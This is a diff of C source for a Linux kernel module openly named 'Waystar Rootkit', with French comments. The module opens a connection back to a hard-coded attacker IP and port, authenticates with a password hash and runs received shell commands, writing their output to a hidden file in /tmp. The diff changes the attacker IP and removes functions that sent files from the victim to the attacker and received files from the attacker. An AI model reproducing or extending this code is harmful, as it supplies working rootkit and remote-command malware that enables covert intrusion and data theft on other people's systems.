@@ -14,14 +14,13 @@
 #include <linux/socket.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
-#include <linux/buffer_head.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Corentin Dupaigne & Valentin Mougin");
 MODULE_DESCRIPTION("Waystar Rootkit");
 MODULE_VERSION("0.1");
 
-static char *attacker_ip = "192.168.186.235";
+static char *attacker_ip = "192.168.1.30";
 static int attacker_port = 5555;
 static char *password_sha256 =
     "dd58add07f93b3ad6ffcebf0fbacf16a15260793cae2f8b00a5fe701d8d85676";
@@ -35,7 +34,6 @@ MODULE_PARM_DESC(password_sha256,
 
 #define CMD_MAX_LEN 1024
 #define OUT_FILE "/tmp/.waystar_out"
-#define MAX_FILE_SIZE (10 * 1024 * 1024) // 10MB max file size
 
 static struct task_struct *conn_thread;
 static struct socket *conn_sock;
@@ -184,157 +182,6 @@ static int execute_and_capture(const char *cmd)
 }
 
 /*
- * Gère le téléchargement d'un fichier depuis la machine victime vers l'attaquant.
- * 
- * @param file_path Chemin du fichier à télécharger.
- * @return 0 en cas de succès, code d'erreur sinon.
- */
-static int handle_file_download(const char *file_path)
-{
-    struct file *f;
-    mm_segment_t oldfs;
-    loff_t pos = 0;
-    char *file_buf;
-    int ret = 0;
-    loff_t file_size;
-    uint32_t net_size;
-    char error_msg[128];
-
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
-
-    f = filp_open(file_path, O_RDONLY, 0);
-    if (IS_ERR(f)) {
-        ret = PTR_ERR(f);
-        snprintf(error_msg, sizeof(error_msg), "ERROR:Cannot open file: %d", ret);
-        net_size = htonl(strlen(error_msg));
-        sock_send_all(conn_sock, &net_size, sizeof(net_size));
-        sock_send_all(conn_sock, error_msg, strlen(error_msg));
-        set_fs(oldfs);
-        return ret;
-    }
-
-    file_size = i_size_read(file_inode(f));
-    if (file_size > MAX_FILE_SIZE) {
-        snprintf(error_msg, sizeof(error_msg), "ERROR:File too large (%lld bytes)", file_size);
-        net_size = htonl(strlen(error_msg));
-        sock_send_all(conn_sock, &net_size, sizeof(net_size));
-        sock_send_all(conn_sock, error_msg, strlen(error_msg));
-        filp_close(f, NULL);
-        set_fs(oldfs);
-        return -EFBIG;
-    }
-
-    // Send file size
-    char size_str[32];
-    snprintf(size_str, sizeof(size_str), "%lld", file_size);
-    net_size = htonl(strlen(size_str));
-    sock_send_all(conn_sock, &net_size, sizeof(net_size));
-    sock_send_all(conn_sock, size_str, strlen(size_str));
-
-    // Allocate buffer and read file
-    file_buf = kmalloc(file_size, GFP_KERNEL);
-    if (!file_buf) {
-        filp_close(f, NULL);
-        set_fs(oldfs);
-        return -ENOMEM;
-    }
-
-    ret = vfs_read(f, file_buf, file_size, &pos);
-    if (ret < 0) {
-        kfree(file_buf);
-        filp_close(f, NULL);
-        set_fs(oldfs);
-        return ret;
-    }
-
-    // Send file content
-    sock_send_all(conn_sock, file_buf, file_size);
-
-    kfree(file_buf);
-    filp_close(f, NULL);
-    set_fs(oldfs);
-    return 0;
-}
-
-/*
- * Gère le téléversement d'un fichier depuis l'attaquant vers la machine victime.
- * 
- * @param file_path Chemin où enregistrer le fichier.
- * @param file_size Taille du fichier à recevoir.
- * @return 0 en cas de succès, code d'erreur sinon.
- */
-static int handle_file_upload(const char *file_path, size_t file_size)
-{
-    struct file *f;
-    mm_segment_t oldfs;
-    loff_t pos = 0;
-    char *file_buf;
-    int ret = 0;
-    uint32_t net_len;
-    const char *ack = "READY";
-    const char *success_msg = "File uploaded successfully";
-    const char *error_msg = "Error writing file";
-
-    if (file_size > MAX_FILE_SIZE) {
-        net_len = htonl(strlen(error_msg));
-        sock_send_all(conn_sock, &net_len, sizeof(net_len));
-        sock_send_all(conn_sock, error_msg, strlen(error_msg));
-        return -EFBIG;
-    }
-
-    // Send acknowledgment
-    net_len = htonl(strlen(ack));
-    sock_send_all(conn_sock, &net_len, sizeof(net_len));
-    sock_send_all(conn_sock, ack, strlen(ack));
-
-    // Allocate buffer for file content
-    file_buf = kmalloc(file_size, GFP_KERNEL);
-    if (!file_buf) {
-        return -ENOMEM;
-    }
-
-    // Receive file content
-    ret = sock_recv_all(conn_sock, file_buf, file_size);
-    if (ret <= 0) {
-        kfree(file_buf);
-        return ret;
-    }
-
-    // Write file
-    oldfs = get_fs();
-    set_fs(KERNEL_DS);
-
-    f = filp_open(file_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (IS_ERR(f)) {
-        ret = PTR_ERR(f);
-        net_len = htonl(strlen(error_msg));
-        sock_send_all(conn_sock, &net_len, sizeof(net_len));
-        sock_send_all(conn_sock, error_msg, strlen(error_msg));
-        kfree(file_buf);
-        set_fs(oldfs);
-        return ret;
-    }
-
-    ret = vfs_write(f, file_buf, file_size, &pos);
-    filp_close(f, NULL);
-    set_fs(oldfs);
-
-    if (ret < 0) {
-        net_len = htonl(strlen(error_msg));
-        sock_send_all(conn_sock, &net_len, sizeof(net_len));
-        sock_send_all(conn_sock, error_msg, strlen(error_msg));
-    } else {
-        net_len = htonl(strlen(success_msg));
-        sock_send_all(conn_sock, &net_len, sizeof(net_len));
-        sock_send_all(conn_sock, success_msg, strlen(success_msg));
-    }
-
-    kfree(file_buf);
-    return ret;
-}
-
-/*
  * Fonction principale exécutée dans le thread du rootkit.
  * Établit une connexion TCP avec l'attaquant, s’authentifie,
  * puis boucle pour recevoir et exécuter des commandes à distance.
@@ -415,30 +262,8 @@ static int connection_worker(void *data)
                 break;
             cmd[len] = '\0';
 
-            // Check if it's a file operation command
-            if (strncmp(cmd, "UPLOAD:", 7) == 0) {
-                char *path_start = cmd + 7;
-                char *size_start = strchr(path_start, ':');
-
-                if (size_start) {
-                    *size_start = '\0';
-                    size_start++;
-                    size_t file_size = simple_strtoul(size_start, NULL, 10);
-
-                    pr_info("[Waystar] File upload request: %s (%zu bytes)\n", path_start, file_size);
-                    handle_file_upload(path_start, file_size);
-                } else {
-                    pr_err("[Waystar] Invalid upload command format\n");
-                }
-            } else if (strncmp(cmd, "DOWNLOAD:", 9) == 0) {
-                char *path = cmd + 9;
-
-                pr_info("[Waystar] File download request: %s\n", path);
-                handle_file_download(path);
-            } else {
-                pr_info("[Waystar] Exec: %s\n", cmd);
-                execute_and_capture(cmd);
-            }
+            pr_info("[Waystar] Exec: %s\n", cmd);
+            execute_and_capture(cmd);
         }
 
     disconnect:
